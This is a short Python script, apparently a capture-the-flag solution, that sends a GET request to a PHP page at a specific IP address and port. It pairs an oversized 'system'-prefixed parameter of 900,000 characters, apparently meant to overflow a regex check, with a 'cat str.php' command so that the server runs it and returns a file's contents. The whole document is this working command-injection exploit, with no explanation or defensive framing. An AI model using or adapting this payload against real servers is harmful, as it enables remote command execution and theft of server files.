import requests, re
from io import BytesIO

data='system'+ 'a'*900000
data.encode()
res= requests.get("http://120.27.195.236:28991/55_5_55.php?b=cat%20str.php&a=" + data)
print(res.text)
